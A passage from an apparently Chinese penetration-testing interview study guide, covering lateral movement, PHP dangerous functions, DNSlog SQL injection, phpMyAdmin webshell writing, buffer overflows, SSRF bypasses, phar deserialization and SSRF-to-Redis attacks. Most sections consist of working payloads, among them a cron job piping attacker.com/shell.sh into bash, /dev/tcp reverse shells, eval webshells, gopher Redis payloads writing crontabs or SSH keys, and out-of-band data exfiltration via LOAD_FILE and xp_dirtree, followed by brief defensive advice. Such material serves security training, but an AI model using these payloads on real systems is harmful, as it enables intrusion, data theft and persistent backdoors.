- **工具**：`Nishang`的`Tcp-Zombie`模块，复用已有HTTP会话传输数据。

---

### **三、横向渗透技术**

#### **1. 内网扫描与信息收集** 


- **存活探测**：
    
    Bash
    
    `for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done`
    
- **端口扫描**：
    
    Bash
    
    `nmap -Pn -sT 192.168.1.0/24 -p 80,445,3389`
    

#### **2. 凭证窃取与重用** 


- **Windows系统**：
    - **Mimikatz**：抓取内存密码与哈希。
    - **Procdump+离线解析**：绕过杀软内存防护。
- **Linux系统**：
    - 读取`/etc/shadow`及SSH私钥（`~/.ssh/id_rsa`）。

#### **3. 横向移动手法** 


- **WMI执行命令**：
    
    Bash
    
    `wmic /node:192.168.1.10 /user:admin /password:Passw0rd process call create "cmd.exe /c whoami"`
    
- **PsExec远程控制**：
    
    Bash
    
    `PsExec.exe \\192.168.1.10 -u admin -p Passw0rd -s cmd.exe`
    

---

### **四、权限维持与隐蔽**

#### **1. 持久化后门** 

- **Windows**：
    - 注册表自启动：`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`。
    - 计划任务：`schtasks /create /tn "Update" /tr "C:\shell.exe" /sc daily`。
- **Linux**：
    - Crontab定时任务：`*/5 * * * * curl http://attacker.com/shell.sh | bash`。

#### **2. 免杀技术** 


- **内存加载**：使用`Cobalt Strike`的`execute-assembly`执行PE文件。
- **混淆加密**：对Webshell进行AES加密或字符编码（如Base64）。

---

### **五、防御建议**

1. **网络隔离**：限制Web服务器出站流量，仅开放必要协议。
2. **日志监控**：
    - 分析异常DNS查询（如大量`attacker.com`解析）。
    - 监控ICMP数据包长度及频率异常。
3. **主机加固**：
    - 禁用高权限账户远程登录。
    - 定期清理无用计划任务及服务。


## 21.PHP 代码执行的危险函数？PHP 命令执行函数？

### **一、PHP代码执行危险函数**

#### **1. 动态代码执行**

| **函数**              | **风险描述**                                  | **示例**                                                          |
| ------------------- | ----------------------------------------- | --------------------------------------------------------------- |
| `eval()`            | 直接执行字符串中的PHP代码，常用于WebShell。               | `eval($_GET['code']);` <br><br>                                 |
| `assert()`          | PHP5中可执行字符串代码，PHP7后需传入表达式。                | `assert($_POST['cmd']);` <br><br>                               |
| `preg_replace()`    | 使用`/e`修饰符时，替换字符串会作为代码执行（PHP5.5废弃，PHP7移除）。 | `preg_replace("/.*/e", $_GET['code'], "");` <br><br>            |
| `create_function()` | 内部使用`eval()`创建匿名函数，参数未过滤可执行任意代码。          | `$func = create_function('', $_GET['code']); $func();` <br><br> |

#### **2. 回调函数执行**

| **函数**                   | **风险描述**                       | **示例**                                                          |
| ------------------------ | ------------------------------ | --------------------------------------------------------------- |
| `call_user_func()`       | 第一个参数作为回调函数执行，参数可控时可执行任意代码。    | `call_user_func($_GET['func'], $_GET['arg']);` <br><br>         |
| `call_user_func_array()` | 类似`call_user_func()`，参数通过数组传递。 | `call_user_func_array('system', array($_GET['cmd']));` <br><br> |
| `array_map()`            | 对数组元素应用回调函数，参数可控时执行代码。         | `array_map($_GET['func'], array($_GET['cmd']));` <br><br>       |
| `array_filter()`         | 通过回调函数过滤数组元素，参数未过滤导致代码执行。      | `array_filter(array($_GET['cmd']), $_GET['func']);` <br><br>    |

#### **3. 其他执行方式**

- **动态函数调用**：`$_GET['a']($_GET['b']);`（如`?a=system&b=whoami`） 
    
    
- **反序列化漏洞**：`unserialize()`加载恶意序列化数据触发代码执行 
    

---

### **二、PHP命令执行危险函数**

#### **1. 直接执行系统命令**

| **函数**         | **风险描述**                  | **示例**                                    |
| -------------- | ------------------------- | ----------------------------------------- |
| `system()`     | 执行命令并输出结果，常用于获取命令回显。      | `system($_GET['cmd']);` <br><br>          |
| `exec()`       | 执行命令并返回最后一行输出，可捕获完整结果到数组。 | `exec($_GET['cmd'], $output);` <br><br>   |
| `passthru()`   | 直接输出命令执行结果，适用于二进制数据。      | `passthru("cat /etc/passwd");` <br><br>   |
| `shell_exec()` | 执行命令并返回完整输出字符串，需开启安全模式关闭。 | `echo shell_exec($_GET['cmd']);` <br><br> |
| **反引号（``）**    | 与`shell_exec()`等效，执行运算符。  | ``echo `whoami`;`` <br><br>               |

#### **2. 进程控制相关**

| **函数**         | **风险描述**                  | **示例**                                                     |
| -------------- | ------------------------- | ---------------------------------------------------------- |
| `popen()`      | 打开进程管道，允许读写命令输入/输出。       | `popen($_GET['cmd'], 'r');` <br><br>                       |
| `proc_open()`  | 更复杂的进程控制，可操作标准输入/输出/错误流。  | `proc_open($_GET['cmd'], $descriptors, $pipes);` <br><br>  |
| `pcntl_exec()` | 替换当前进程为指定命令，需启用`pcntl`扩展。 | `pcntl_exec("/bin/bash", array("-c", $_GET['cmd']));` <br> |

#### **3. 环境变量与协议利用**

| **函数/方法**  | **风险描述**                                      | **示例**                                                        |
| ---------- | --------------------------------------------- | ------------------------------------------------------------- |
| `putenv()` | 修改环境变量，可配合`mail()`等函数绕过`disable_functions`限制。 | `putenv("LD_PRELOAD=/tmp/evil.so");` <br><br>                 |
| `mail()`   | 配置不当情况下，`additional_parameters`参数可能触发命令执行。    | `mail("", "", "", "", "-X/var/www/html/shell.php");` <br><br> |

---

### **三、防御建议**

1. **禁用高危函数**：在`php.ini`中设置`disable_functions`禁用`system`、`exec`等函数 
    
    
2. **输入过滤**：对用户输入进行严格白名单校验，禁止传入特殊字符（如`;`、`|`）。
3. **安全配置**：
    - 关闭`register_globals`和`allow_url_include`。
    - 使用`open_basedir`限制文件访问范围 
        
        
4. **代码审计**：避免动态执行用户可控参数，使用参数化查询或安全库（如`escapeshellarg()`） 
    

## 22.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码？mssql 下又如何？

### **一、DNSlog注入原理**

- **核心思路**：将查询结果拼接到DNS请求的域名中，通过DNS解析日志获取数据。
- **优势**：
    - 绕过防火墙/IP封禁，减少直接请求次数。
    - 适用于无回显、无报错、无时间盲注特征的场景。

---

### **二、MySQL DNSlog注入**

#### **1. 利用条件**

- 数据库用户需具备`FILE`权限（允许`load_file`函数访问网络路径）。
- 目标MySQL服务允许外连（`secure_file_priv`未限制网络访问）。

#### **2. 构造Payload**

- **查询当前数据库名**：
    
    SQL
    `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.ceye.io\\abc'));`
    
    - **说明**：
        - `CONCAT`拼接域名，格式为`\\<数据>.ceye.io\abc`（Windows UNC路径）。
        - `LOAD_FILE`触发DNS解析，数据将出现在DNS日志中。
- **查询表名**：
    
    SQL
    
    `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),'.xxx.ceye.io\\abc'));`
    

#### **3. 注入示例**

- **攻击URL**：
    
    Http
    
    `http://target.com/vul.php?id=1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.xxx.ceye.io\\abc')))-- -`
    
- **DNSlog平台（如ceye.io）**：查看解析记录，获取`database_name.xxx.ceye.io`。

---

### **三、MSSQL DNSlog注入**

#### **1. 利用条件**

- 启用`xp_dirtree`或`xp_subdirs`存储过程权限（默认`public`角色可执行）。

#### **2. 构造Payload**

- **查询当前数据库名**：
    
    SQL
    
    `DECLARE @host VARCHAR(1024);   SELECT @host=(SELECT DB_NAME())+'.xxx.ceye.io';   EXEC master..xp_dirtree @host;`  
    
    - **说明**：`xp_dirtree`尝试访问`数据库名.xxx.ceye.io`路径，触发DNS解析。
- **查询系统用户**：
    
    SQL
    
    `DECLARE @host VARCHAR(1024);   SELECT @host=(SELECT SYSTEM_USER)+'.xxx.ceye.io';   EXEC master..xp_subdirs @host;`  
    

#### **3. 注入示例**

- **攻击语句**：
    
    SQL
    
    `'; DECLARE @host VARCHAR(1024); SELECT @host=(SELECT DB_NAME())+'.xxx.ceye.io'; EXEC master..xp_dirtree @host;--` 
    
- **结果获取**：DNS日志中显示`数据库名.xxx.ceye.io`的解析记录。

---

### **四、其他数据库DNSlog注入**

#### **1. Oracle**

- **利用UTL_HTTP**：
    
    SQL
    
    `SELECT UTL_HTTP.REQUEST('http://'||(SELECT SYS_CONTEXT('USERENV','CURRENT_USER'))||'.xxx.ceye.io') FROM DUAL;`
    

#### **2. PostgreSQL**

- **COPY语句触发DNS**：
    
    SQL
    
    `DROP TABLE IF EXISTS tmp;   CREATE TABLE tmp(data TEXT);   COPY tmp FROM PROGRAM 'nslookup $(SELECT current_user).xxx.ceye.io';`  
    

---

### **五、自动化工具辅助**

#### **1. SQLMap集成DNSlog**

- **命令示例**：
    
    Bash
    
    `sqlmap -u "http://target.com/vul.php?id=1" --technique=B --dns-domain=xxx.ceye.io`
    
    - **参数说明**：`--dns-domain`指定DNSlog平台域名，自动外带数据。

#### **2. 自定义脚本**

- **Python示例**：
    
    Python
    
    `import requests dns_sub = "xxx.ceye.io" payload = f"1' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.{dns_sub}\\abc')))-- -" requests.get(f"http://target.com/vul.php?id={payload}")`
    

---

### **六、防御建议**

1. **权限控制**：
    - MySQL：限制用户`FILE`权限，设置`secure_file_priv=""`。
    - MSSQL：禁用`xp_dirtree`等危险存储过程。
2. **输入过滤**：对特殊字符（`\\`、`.`）进行转义或拦截。
3. **日志监控**：分析异常DNS请求（如频繁解析特定子域名）。

---

通过DNSlog注入可高效突破无回显限制，实际测试需确保目标数据库具备出网权限，并选择稳定的DNSlog平台（如ceye.io、dnslog.cn）。

## 23.phpmyadmin写sehll的方法？

常规导入shell的操作

一句话导出shell

日志备份获取shell

### **一、常规导入Shell（SELECT INTO OUTFILE）**

#### **前提条件**

1. 拥有MySQL的`FILE`权限（通常为root用户） 
    
    
2. 已知网站绝对路径（可通过phpinfo、报错信息或数据库路径推测） 
    
    
3. `secure_file_priv`参数为空或允许目标目录写入（非NULL或受限路径） 
    
    
#### **操作步骤**

4. **检查写入权限**：
    
    SQL
    
    `SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';   -- 若返回空值或目标路径，则可继续。`
    
5. **写入Webshell**：
    
    SQL
    
    `SELECT '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';   -- Windows路径示例：C:\\xampp\\htdocs\\shell.php。`
    
6. **绕过安全限制**：
    
    - **Hex编码绕过**：
        
        SQL
        
        `SELECT 0x3C3F70687020406576616C28245F504F53545B27636D64275D293B3F3E INTO OUTFILE '/var/www/html/bypass.php';`  
        
    - **内联注释绕过**：
        
        SQL
        
        `/*!50001SELECT*/ '<?php @eval($_POST["cmd"]);?>' INTO OUTFILE '/var/www/html/bypass.php';`  
        

---

### **二、创建临时表写入Shell**

#### **适用场景**

当直接`INTO OUTFILE`被拦截时，可通过创建表间接导出

#### **操作步骤**

7. **创建表并插入恶意代码**：
    
    SQL
    
    ``CREATE TABLE `mysql`.`shell` (data TEXT);   INSERT INTO `shell` (data) VALUES ('<?php @eval($_POST["cmd"]);?>');``  
    
8. **导出到Web目录**：
    
    SQL
    
    ``SELECT data FROM `shell` INTO OUTFILE '/var/www/html/shell.php';   DROP TABLE `shell`;  -- 清理痕迹。``
    

---

### **三、日志备份获取Shell（General Log）**

#### **适用场景**

当`secure_file_priv`限制严格时，利用MySQL日志功能写入

#### **操作步骤**

9. **开启全局日志**：
    
    SQL
    
    `SET GLOBAL general_log = 'ON';  -- 开启日志记录。`
    
10. **修改日志文件路径**：
    
    SQL
    
    `SET GLOBAL general_log_file = '/var/www/html/shell.php';  -- 指向Web目录。`
    
11. **写入Webshell**：
    
    SQL
    
    `SELECT '<?php @eval($_POST["cmd"]);?>';  -- 日志中记录此语句，自动写入文件。`
    
12. **恢复日志配置（可选）**：
    
    SQL
    
    `SET GLOBAL general_log_file = '/var/log/mysql/general.log';   SET GLOBAL general_log = 'OFF';  -- 避免持续暴露。`
    

---

### **四、慢查询日志写入Shell**

#### **操作步骤**

13. **开启慢查询日志**：
    
    SQL
    
    `SET GLOBAL slow_query_log = 'ON';   SET GLOBAL long_query_time = 10;  -- 设置超时阈值。`
    
14. **修改日志路径**：
    
    SQL
    
    `SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';`  
    
15. **触发慢查询**：
    
    SQL
    
    `SELECT '<?php @eval($_POST["cmd"]);?>' OR SLEEP(11);  -- 触发日志写入。`
    

---

### **五、防御与修复建议**

16. **限制MySQL权限**：
    
    - 禁用`FILE`权限，设置`secure_file_priv = /tmp` 
        
       
    - 避免使用root账户连接phpMyAdmin 
    
17. **日志监控**：
    
    - 监控`general_log`和`slow_query_log`的异常修改 
    
18. **版本升级**：
    
    - 更新phpMyAdmin至最新版，修复已知漏洞 
        

---

**总结**：优先尝试`SELECT INTO OUTFILE`直接写入，若受限则使用日志功能或临时表间接写入。实际利用需结合目标环境调整路径和绕过策略

## 24.缓冲区溢出原理

由于C/C++语言没有数组越界检查机制，当向局部数组缓冲区里写入的数据超过

为其分配的大小时，就会发生缓冲区溢出。攻击者可利用缓冲区溢出来窜改进程

运行时栈，从而改变程序正常流向，轻则导致程序崩溃，重则系统特权被窃取。

比如只有1000，你写入1500，多出了500，其中的100在汇编里调用JMP，剩下

400是shellcode，那100字节调用JMP跳到shellcode，然后反弹连接。

### **一、漏洞核心机制**

#### **1. 内存布局缺陷**

- **程序内存结构**：
    
    |**区域**|**用途**|**增长方向**|
    |---|---|---|
    |**代码段**|存储可执行指令|固定|
    |**数据段**|全局变量/静态变量|固定|
    |**堆**|动态分配内存（malloc/new）|向上增长|
    |**栈**|局部变量/函数调用信息|向下增长|
    
- **栈帧结构**：
    
    Plaintext
    
    `| 局部变量 | 旧EBP | 返回地址 | 参数区 | ↑低地址       ↑栈顶`
    

#### **2. 溢出触发条件**

- **越界写入**：向局部数组（如`char buffer`）写入超过其长度的数据。
- **关键覆盖**：溢出数据覆盖返回地址（EIP/RIP），劫持程序执行流程。

---

### **二、攻击流程（以栈溢出为例）**

#### **1. 构造恶意输入**

- **Payload结构**：
    
    Plaintext
    
    `| 填充数据（NOP雪橇） | Shellcode | 重复返回地址 |`
    
    - **NOP雪橇**：`\x90`指令（空操作）提高跳转容错性。
    - **Shellcode**：机器码形式的攻击载荷（如反弹Shell）。
    - **返回地址**：覆盖为Shellcode起始地址或JMP指令地址。

#### **2. 覆盖返回地址**

- **偏移计算**：通过调试工具（如GDB）确定缓冲区到返回地址的偏移量。
    
    Bash
    
    `# 生成定位字符串 pattern create 300 # 确定溢出点 pattern offset $eip`
    
- **地址对齐**：考虑小端序（x86）调整地址字节顺序（`0x08041234` → `\x34\x12\x04\x08`）。

#### **3. 执行流程劫持**

- **EIP重定向**：覆盖返回地址指向Shellcode或JMP指令。
- **代码执行**：处理器执行Shellcode，完成提权、反向连接等操作。

---

### **三、攻击示例（Linux x86反弹Shell）**

#### **1. Shellcode生成**

Bash

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c`

输出：

C

`unsigned char shellcode[] =  "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80...";`

#### **2. 构造Payload**

Python

`padding = 'A' * 256  # 覆盖缓冲区 ret_addr = '\x90\xd0\xff\xff'  # 指向NOP雪橇 nop_sled = '\x90' * 100 payload = padding + ret_addr + nop_sled + shellcode`

#### **3. 触发漏洞**

Bash

`./vuln_program $(python -c "print payload")`

---

### **四、现代防护机制与绕过**

#### **1. 防御技术**

|**机制**|**原理**|**绕过方法**|
|---|---|---|
|**DEP/NX**|标记数据区不可执行|ROP链（复用代码片段）|
|**ASLR**|随机化内存地址|信息泄露漏洞获取基址|
|**Stack Canary**|检测栈溢出|泄露Canary值或覆盖未保护区域|
|**SafeSEH**|验证异常处理链完整性|覆盖非受控模块的SEH处理器|

#### **2. 绕过ASLR + DEP**

- **Return-to-libc**：调用`system("/bin/sh")`替代Shellcode。
- **ROP（Return-Oriented Programming）**：拼接代码片段（gadget）构造攻击链。

---

### **五、漏洞修复建议**

1. **安全编码**：
    - 使用安全函数（`strncpy`替代`strcpy`，`snprintf`替代`sprintf`）。
    - 启用编译器保护（GCC参数`-fstack-protector-all`、`-Wl,-z,relro`）。
2. **运行时防护**：
    - 启用DEP（数据执行保护）和ASLR（`echo 2 > /proc/sys/kernel/randomize_va_space`）。
    - 部署EDR（终端检测响应）监控异常进程行为。
3. **代码审计**：静态分析工具（Coverity、Fortify）检测潜在溢出点。

---

### **六、实际案例**

- **CVE-2021-3156（Sudo堆溢出）**：通过构造恶意输入覆盖堆元数据，实现权限提升。
- **MS08-067（Windows Server服务溢出）**：利用栈溢出传播Conficker蠕虫。

## 25.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？

(1) 利用进制转换

(2) 利用DNS解析

(3) 利用句号（127。0。0。1）

(4) 利用[::]（http://[::]:80/）；

(5) 利用@（http ://example.com@127.0.0.1）；

(6) 利用短地址（http ://dwz.cn/11SMa）；

(7) 协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）

### **一、绕过本地地址过滤的方法**

#### **1. 进制转换与特殊格式**

|**方法**|**示例**|**原理**|
|---|---|---|
|**十进制/十六进制转换**|`http://2130706433` → 127.0.0.1  <br>`http://0x7f000001` → 127.0.0.1|利用 IP 的十进制或十六进制表示绕过字符串匹配。|
|**IPv6 本地地址**|`http://[::]:80`  <br>`http://[::1]:8080`|IPv6 的本地地址表示（`::` 为全零地址，`::1` 为本地回环）。|
|**CIDR 格式**|`http://127.0.0.1.xip.io`  <br>`http://127.127.127.127`|利用域名解析服务（如 xip.io）或重复 IP 段绕过过滤。|

#### **2. 字符混淆与编码**

|**方法**|**示例**|**原理**|
|---|---|---|
|**全角/半角符号混淆**|`http://127。0。0。1`  <br>`http://127.0.0.1．`|使用全角句号（`．`）或 Unicode 字符绕过正则匹配。|
|**URL 编码混淆**|`http://%31%32%37%2e%30%2e%30%2e%31` → 127.0.0.1|对 IP 地址进行 URL 编码，绕过基于关键词的过滤。|
|**Host 头注入**|`GET / HTTP/1.1<br>Host: 127.0.0.1`|在 HTTP 请求头中直接指定目标 Host，绕过前端 URL 解析。|

#### **3. 域名与重定向**

|**方法**|**示例**|**原理**|
|---|---|---|
|**DNS 重绑定**|注册域名首次解析为合法 IP，后续解析为 127.0.0.1。|利用 DNS TTL 过期后重新解析到内网地址。|
|**302 跳转**|攻击者服务器返回 `302 Found`，跳转到 `http://127.0.0.1:8080`。|服务端跟随跳转，绕过初始 URL 的过滤规则。|
|**短链接服务**|`http://bit.ly/xxxxx` → 实际指向内网地址。|隐藏真实目标地址，需确保短链服务未过滤内网 IP。|

---

### **二、可用的协议及利用场景**

#### **1. 高危协议**

|**协议**|**利用场景**|**示例 Payload**|
|---|---|---|
|**Gopher**|构造任意 TCP 请求（如 Redis 未授权访问、FastCGI RCE）。|`gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3...`|
|**Dict**|探测端口信息或执行 Redis 命令。|`dict://127.0.0.1:6379/info`|
|**File**|读取本地文件（通常被禁用，但部分环境可用）。|`file:///etc/passwd`|
|**LDAP**|触发 LDAP 查询注入或连接内部服务。|`ldap://127.0.0.1:389/%0astats%0aquit`|

#### **2. 中低危协议**

|**协议**|**利用场景**|**示例 Payload**|
|---|---|---|
|**TFTP**|文件传输协议，可用于探测内网服务。|`tftp://127.0.0.1:69/TESTUDPPACKET`|
|**SFTP**|尝试 SSH 连接或密钥泄露。|`sftp://user@127.0.0.1:22/`|
|**HTTP/HTTPS**|绕过限制访问内网 Web 服务（如 Jenkins、Consul）。|`http://admin:admin@192.168.1.10:8080/manage`|

#### **3. 其他协议**

|**协议**|**利用场景**|**示例 Payload**|
|---|---|---|
|**SMTP**|探测邮件服务器或发送恶意邮件。|`smtp://127.0.0.1:25/MAIL%20FROM:attacker@evil.com`|
|**Redis**|直接利用未授权访问（需协议支持）。|`redis://127.0.0.1:6379/`|

---

### **三、防御建议**

1. **输入过滤**：
    
    - 使用白名单校验协议和域名，禁止非常用协议（如 Gopher、Dict）。
    - 正则匹配所有 IP 表示形式（包括进制、IPv6、混淆字符）。
2. **网络隔离**：
    
    - 禁止服务端发起非必要协议的请求（如禁用 `file://`、`gopher://`）。
    - 限制出站流量仅允许访问可信外部资源。
3. **服务加固**：
    
    - 内网服务启用认证机制（如 Redis 设置密码）。
    - 定期更新中间件，修复已知 SSRF 漏洞（如 Discuz! 的 `phpcurl` 缺陷）。

---

### **四、案例演示**

#### **绕过案例**：利用 DNS 重绑定攻击内网 Redis

4. **注册域名**：`rebind.evil.com` 配置 A 记录为 `合法IP` 和 `127.0.0.1`（TTL=1）。
5. **触发请求**：
    
    Http
    
    `http://vuln.com/ssrf.php?url=http://rebind.evil.com:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...`
    
6. **漏洞利用**：服务器首次解析合法 IP，后续请求重定向到 Redis 执行命令。

## 26.phar协议如何利用，php伪协议input与post数据包发送有什么区别？

可以Bypass一些waf，绕过上传限制

Phar反序列化，Phar:// 伪协议读取phar文件时，会反序列化meta-data储存

区别

application/x-www-form-urlencoded 或multipart/form-data时，

php://input 中是原始数据。 $_POST 中是关联数组，且没有上传控件的内

容。

enctype="multipart/form-data" 时php://input 是无效的。

Content-Type = "text/plain"时，$_POST 不能获取post的数据，

php://input可以。

### **一、PHAR协议利用详解**

#### **1. PHAR文件结构**

PHAR（PHP Archive）文件是PHP的一种打包格式，包含以下部分：

- **Stub**：文件头标识（如`<?php __HALT_COMPILER(); ?>`）。
- **Manifest**：元数据（`metadata`），可存储序列化对象。
- **文件内容**：压缩或未压缩的文件数据。
- **签名**：可选的文件校验部分。

#### **2. PHAR反序列化漏洞**

- **触发条件**：
    
    - 使用`phar://`协议访问PHAR文件（如`include('phar://test.phar')`）。
    - 目标代码存在**反序列化操作**（如`unserialize()`或类自动加载）。
- **利用步骤**：
    
    1. **构造恶意PHAR文件**：
        
        PHP
        
        `class Exploit { /* 定义可触发__destruct()的类 */ } $phar = new Phar('exploit.phar'); $phar->startBuffering(); $phar->addFromString('test.txt', 'text'); // 添加文件内容 $phar->setMetadata(new Exploit()); // 注入恶意对象 $phar->stopBuffering();`
        
    2. **文件上传**：将`exploit.phar`重命名为`exploit.jpg`绕过上传限制。
    3. **触发反序列化**：通过`phar://`协议访问该文件：
        
        PHP
        
        `file_get_contents('phar://uploads/exploit.jpg/test.txt');`
        
- **绕过限制**：
    
    - **文件头伪装**：添加GIF头`GIF89a`绕过图片上传检测。
    - **压缩绕过**：使用`Phar::GZ`压缩避免静态检测恶意代码。

#### **3. 防御措施**

- 禁用`phar://`协议：`allow_url_include=Off`。
- 检查文件头：上传时验证真实文件类型，而非仅扩展名。

---

### **二、php://input与$_POST的区别**

#### **1. 数据处理方式对比**

|**条件**|**php://input**|**$_POST**|
|---|---|---|
|**enctype=application/x-www-form-urlencoded**|包含原始POST数据（如`a=1&b=2`）|解析为关联数组（`$_POST['a']=1`）|
|**enctype=multipart/form-data**|**无效**（无法读取）|解析表单字段和上传文件（`$_FILES`）|
|**Content-Type=text/plain**|可读取原始数据（如JSON/XML）|**无法解析**（保持空数组）|

#### **2. 绕过WAF案例**

- **场景**：WAF过滤`$_POST`中的关键词，但未检测`php://input`。
- **步骤**：
    1. 修改请求头为`Content-Type: text/plain`。
    2. 通过`php://input`发送恶意Payload：
        
        Http
        
        `POST /vuln.php HTTP/1.1 Content-Type: text/plain <?php system('id'); ?>`
        
    3. 目标代码使用`file_get_contents('php://input')`执行代码。

---

### **三、关键差异总结**

1. **数据范围**：
    
    - `php://input`：包含所有原始输入（包括非表单数据）。
    - `$_POST`：仅解析`application/x-www-form-urlencoded`或`multipart/form-data`类型的表单数据。
2. **文件上传**：
    
    - `php://input`无法获取上传文件内容（需使用`$_FILES`）。
3. **性能影响**：
    
    - `php://input`不写入内存，适合处理大流量数据。

---

### **四、实战应用**

#### **1. 上传绕过结合PHAR**

- **步骤**：
    1. 上传伪装为图片的PHAR文件（如`shell.jpg`）。
    2. 通过`phar://`触发反序列化：
        
        PHP
        
        `include('phar://uploads/shell.jpg');`
        

#### **2. 数据外带利用**

- **场景**：目标过滤`$_POST['cmd']`但允许`php://input`：
    
    PHP
    
    `$cmd = file_get_contents('php://input'); system($cmd);`
    
- **攻击请求**：
    
    Bash
    
    `curl -X POST http://target.com/rce.php -d "id" --header "Content-Type: text/plain"`
    

---

### **五、防御建议**

4. **输入源限制**：避免直接使用`php://input`处理敏感操作。
5. **严格解析逻辑**：根据`Content-Type`选择解析方式，拒绝非常规类型。
6. **反序列化安全**：禁止反序列化用户可控数据，使用`json_decode()`替代。

## 27.ssrf怎么用redis写shell？

SSRF服务端请求伪造：

一、对内网扫描，获取banner 。

二、攻击运行在内网的应用，主要是使用GET 参数就可以实现的攻击（比如

Struts2，sqli 等）。

三、利用协议读取本地文件。

四、 云计算环境AWS Google Cloud 环境可以调用内网操作ECS 的 API。

webligic SSRF漏洞：通过SSRF的gopher协议操作内网的redis，利用redis将反

弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a。

### **一、攻击原理**

1. **SSRF触发点**：目标存在可发起任意协议请求的SSRF漏洞（如WebLogic的`uddiexplorer`组件）。
2. **内网Redis未授权访问**：Redis未配置密码且绑定在`0.0.0.0`，允许远程执行命令。
3. **Gopher协议利用**：通过Gopher发送符合Redis协议的Payload，绕过防火墙限制。

---

### **二、攻击步骤**

#### **1. 构造Redis命令**

以写入计划任务反弹Shell为例：

Bash

`# 清空当前数据库（可选） flushall # 设置键值对，值为计划任务命令 set cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击机IP/端口 0>&1\n\n" # 将键值持久化到磁盘 config set dir /var/spool/cron/ config set dbfilename root save`

#### **2. 转换为Redis协议格式**

Redis协议使用`*`表示参数个数，`$`表示参数长度：

Plaintext

`*3\r\n$3\r\nSET\r\n$4\r\ncron\r\n$60\r\n\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击机IP/端口 0>&1\n\n\r\n *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n *1\r\n$4\r\nSAVE\r\n`

#### **3. 生成Gopher Payload**

- **编码处理**：
    
    - 换行符替换：`\r\n` → `%0D%0A`
    - 空格替换： → `%20`
    - 双重URL编码：防止中间件自动解码。
- **最终Gopher URL**：
    

Plaintext

`gopher://目标RedisIP:6379/_%2A3%0D%0A%243%0D%0ASET%0D%0A%244%0D%0Acron%0D%0A%2460%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20/bin/bash%20-i%20%3E%26%20/dev/tcp/攻击机IP/端口%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A`

#### **4. 通过SSRF发送请求**

以WebLogic SSRF为例：

Http

`GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://内网IP&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&protocol=gopher://目标RedisIP:6379/_编码后的Payload HTTP/1.1 Host: vulnerable-weblogic-server:7001`

---

### **三、关键注意事项**

4. **Redis配置与权限**：
    
    - Redis需以root运行，否则无法写入`/var/spool/cron/`目录。
    - 目标系统需启用cron服务，且防火墙允许出站连接到攻击机。
5. **路径差异**：
    
    - **CentOS/RedHat**：计划任务路径为`/var/spool/cron/`。
    - **Ubuntu/Debian**：路径为`/var/spool/cron/crontabs/`。
6. **替代方案（SSH密钥写入）**：
    
    Bash
    
    `flushall set ssh "\n\nssh-rsa AAAAB3NzaC1yc2E...攻击机公钥...\n\n" config set dir /root/.ssh/ config set dbfilename authorized_keys save`
    

---

### **四、防御措施**

7. **SSRF防护**：
    
    - 限制请求协议为HTTP/HTTPS，禁用Gopher、Dict等高危协议。
    - 使用正则表达式过滤内网IP及特殊字符（如`CR/LF`）。
8. **Redis加固**：
    
    - 设置强密码：`requirepass YourPassword`。
    - 限制绑定IP：`bind 127.0.0.1`。
    - 禁用高危命令：`rename-command CONFIG ""`。

---

### **五、工具自动化**

- **Gopherus**：自动生成攻击Redis的Gopher Payload：
    
    Bash
    
    `./gopherus --exploit redis`
    
    输入攻击机IP及端口后，工具自动生成编码后的URL。

---

通过以上方法，可有效利用SSRF攻击内网Redis实现权限获取，实际攻击需结合目标环境调整路径及协议编码方式。


## 28.sqlmap自带脚本你知道哪些？由编写过吗？

1、apostrophemask.py ：将引号替换为UTF-8,用于过滤单引号。

2、base64encode.py :替换为base64编码。

3、multiplespaces.py:围绕SQL关键字添加多个空格。

4、space2plus.py:用+号替换为空格。

### **一、SQLMap 常用 Tamper 脚本分类**

#### **1. 符号混淆类**

| **脚本名称**            | **功能描述**                           | **适用场景**                      |
| ------------------- | ---------------------------------- | ----------------------------- |
| `apostrophemask.py` | 将单引号替换为 Unicode 全角字符 `％EF％BC％87`   | 过滤单引号的场景（如 `'` → `%EF%BC%87`） |
| `equaltolike.py`    | 将 `=` 替换为 `LIKE`                   | 过滤等号的场景（`id=1` → `id LIKE 1`） |
| `greatest.py`       | 将 `>` 替换为 `GREATEST` 函数            | 绕过对比较运算符的过滤                   |
| `htmlencode.py`     | 对关键字符进行 HTML 实体编码（如 `'` → `&#39;`） | 存在 HTML 参数转义的场景               |

#### **2. 空白符绕过类**

